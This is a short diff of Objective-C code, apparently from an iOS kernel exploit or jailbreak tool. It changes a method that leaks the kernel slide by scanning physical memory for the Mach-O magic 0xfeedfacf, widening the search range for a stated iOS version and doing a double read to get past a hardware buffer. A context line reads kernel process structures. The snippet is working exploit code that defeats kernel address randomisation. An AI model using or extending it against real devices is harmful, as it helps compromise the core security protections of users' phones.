@@ -86,12 +86,23 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, uint64_t, uint64_t);
 }
 
 - (uint64_t)leakKernelSlide {
-    for (int i=0; i<0x400; i++) {
-        uint64_t addr = 0xFFFFFFF007004000ULL + (i * 0x200000ULL) + 0x4000;
-        if ([self physRead64:addr] == 0x100000cfeedfacfULL) return (i * 0x200000ULL);
+    uint64_t search_base = 0xFFFFFFF007004000ULL;
+    // No iOS 26.4, o range de busca precisa ser maior (4GB)
+    for (int i = 0; i < 0x800; i++) {
+        uint64_t addr = search_base + (i * 0x200000ULL) + 0x4000;
+        
+        // Primeira leitura: Limpa o buffer de RAZ do AMCC
+        [self physRead64:addr]; 
+        
+        // Segunda leitura: Pega o valor real (Magic 0xfeedfacf)
+        uint64_t magic = [self physRead64:addr];
+        if (magic == 0x100000cfeedfacfULL || (magic & 0xFFFFFFFF) == 0xfeedfacf) {
+            return (i * 0x200000ULL);
+        }
     }
     return 0;
 }
+
 
 - (uint64_t)findProc:(pid_t)p {
     uint64_t proc = [self kread64:(_kBase + 0x8E28000ULL)];
